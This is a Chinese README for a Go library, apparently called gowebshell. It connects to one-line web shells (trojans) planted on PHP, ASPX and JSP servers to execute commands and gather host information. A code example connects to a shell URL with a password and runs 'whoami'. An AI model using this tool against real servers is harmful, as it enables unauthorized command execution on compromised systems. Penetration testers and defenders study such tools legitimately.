# gowebshell

使用go连接常见一句话木马，进行文件管理和命令执行，获取基本信息等功能

## 快速使用

```shell
go get github.com/zyylhn/gowebshell
```

```go
//必须指定一句地址，和链接密码，其他选择性指定
webshell,err:=gowebshell.NewWebshell("http://172.16.95.24/test.php","cc123","",nil)
	if err!=nil{
		fmt.Println(err)
		return
	}
//执行命令，必须要执行命令的目录，命令和使用的shell，windows只能使用cmd，和脚本类型
	cmd,err:=webshell.ExecCommand("/usr","whoami","/bin/sh", gowebshell.PhpScriptCmd,nil)
	if err!=nil{
		fmt.Println(err)
		return
	}
//命令结果存在cmd的result中
	fmt.Println(cmd.Result)
//获取基本信息，指定脚本类型
  info,err:=webshell.GetBaseInfo(gowebshell.JspScriptBaseInfo,nil)
    if err!=nil{
      fmt.Println(err)
			return
    }
    fmt.Println(info)

```

以上会输出

```
www-data
&{/var/www/html / Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64 www-data}

```

## TODO

- [x] 支持php
- [x] 支持aspx
  - [x] jscript执行
  - [ ] C#执行
- [x] 支持jsp
- [ ] 支持asp
- [x] 获取基本信息
- [x] 执行命令
- [ ] 文件管理
